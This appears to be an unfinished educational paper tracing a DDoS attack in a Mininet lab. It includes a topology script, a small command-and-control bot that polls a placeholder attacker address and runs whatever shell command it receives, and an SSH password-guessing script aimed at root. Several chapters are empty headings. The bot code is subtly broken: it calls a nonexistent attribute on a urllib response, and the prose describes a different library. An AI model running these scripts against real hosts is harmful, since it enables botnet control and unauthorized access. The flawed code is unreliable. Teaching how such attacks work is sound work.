---
title: "Anatomy of a DDoS Attack: From Host Infection to Service Denial"
authors:
  - STANISLAS Mélanie
  - BILLY Maxime
---

# Introduction

Understanding the mechanisms of Distributed Denial of Service (DDoS) attacks is crucial in cybersecurity. This paper explores the lifecycle of a DDoS attack, from the initial infection of hosts to the denial of service for a website. 

# Summary

1. [The Sandbox](#The-Sandbox)
2. [Building a simple virus](#Building-a-simple-virus)
2. [Host Compromise](#Host-Compromise)
3. [Launching the Attack](#Launching-the-Attack)
4. [Demo](#Demo)
5. [Forensics](#Forensics)

# The Sandbox

In this chapter, we describe the setup and tools used to emulate and monitor the DDoS attack environment.

## Network Emulation with Mininet

We use Mininet to create a virtual network for our DDoS attack simulation. Mininet allows us to emulate a realistic network topology with minimal hardware requirements.

### Network Topology

Our network topology consists of the following components:

- **1 Attacker Host** (red): This host first infects its victims and then controls them.

- **3 Compromised Hosts** (orange): These hosts are infected and used to generate attack traffic.

- **1 Server Host** (blue): The target of the DDoS attack.

- **1 Client Host** (green): This host attempts to connect to the server and experiences the effects of the DDoS attack.

The network topology can be visualized as follows:

![](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.assets/sandbox-network-diagram.jpg)

We create the network with the following python script:

```python
from mininet.net import Mininet
from mininet.node import Controller, OVSSwitch
from mininet.link import TCLink
from mininet.cli import CLI
from mininet.log import setLogLevel

def create_network():
    # Create a network
    net = Mininet(controller=Controller, link=TCLink, switch=OVSSwitch)
    
    # Add a controller
    net.addController('c0')
    
    # Add switches
    s1 = net.addSwitch('s1')
    s2 = net.addSwitch('s2')
    s3 = net.addSwitch('s3')
    
    # Add hosts and links to s1
    h1 = net.addHost('h1')
    h2 = net.addHost('h2')
    net.addLink(h1, s1, bw=200)
    net.addLink(h2, s1, bw=100)
    
    # Add hosts and links to s2
    h3 = net.addHost('h3')
    h4 = net.addHost('h4')
    net.addLink(h3, s2, bw=100)
    net.addLink(h4, s2, bw=100)
    
    # Add hosts and links to s3
    h5 = net.addHost('h5')
    h6 = net.addHost('h6')
    net.addLink(h5, s3, bw=100)
    net.addLink(h6, s3, bw=100)
    
    # Add links between switches
    net.addLink(s1, s2, bw=1000)
    net.addLink(s2, s3, bw=1000)
    
    # Start the network
    net.start()
    
    # Open the Mininet CLI
    CLI(net)
    
    # Stop the network
    net.stop()

if __name__ == '__main__':
    setLogLevel('info')
    create_network()
```

## Monitoring Tools

To monitor and analyze the network traffic and performance, we use `bwm-ng` (Bandwidth Monitor NG) to monitor the throughput on network interfaces. This helps us understand the volume of traffic generated during the attack.

We also use `tcpdump` to capture and analyze packets on the network. It provides detailed insights into the nature of the traffic and helps in understanding the attack patterns and the commands between compromised hosts and the command and control server.

# Building a simple virus

We will need to control the hosts in the future. To do so, we will create a simple virus that connects to a command and control server to receive commands.

```python
import time
import urllib.request
import subprocess

url = "http://<ATTACKER_IP>"

while True:
    response = urllib.request.urlopen(url)
    command = response.text.strip()

    if command:
        subprocess.call(command, shell=True)
    
    time.sleep(10)
```

This script runs indefinitely, it retrieves the command from the command and control server (`requests.get(url)`) and executes it (`subprocess.call(command, shell=True)`). The script then sleeps for 10 seconds between each command execution.

The idea is that the attacker can host a simple page that will be read by the virus to execute commands on the compromised hosts.

# Host Compromise

In this chapter, we describe examples of how hosts can be compromised and infected with malware to participate in a DDoS attack.

## Phishing

## Exploiting a Vulnerability (e.g., Log4j)

## Weak Passwords && Configuration

Finally, to compromise the last host we will take advantage of the weak password configured for an ssh server.

We can make a simple dictionary attack with the following script:

```python
import paramiko

host = "<SERVER_IP>"
port = 22
username = "root"
passwords = ["root", "toor", "admin"]

for password in passwords:
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, port=port, username=username, password=password)
        print(f"Successfully connected to {host} with password: {password}")
        break
    except paramiko.AuthenticationException:
        print(f"Failed to connect to {host} with password: {password}")
```

This script tries to connect to the server with the provided passwords. If the connection is successful, it prints the password used to connect.

This shows the threat of weak passwords or weakly configured services in compromising hosts.

### Mitigation

To mitigate the risk of weak passwords, it is essential to enforce strong password policies.

Even better for SSH, you can use public key authentication and disable password authentication.

Finally, it is also recommended to use tools like `fail2ban` to block brute force attacks.

# Launching the Attack

# Demo

# Forensics

# Conclusion and Mitigation

# Sources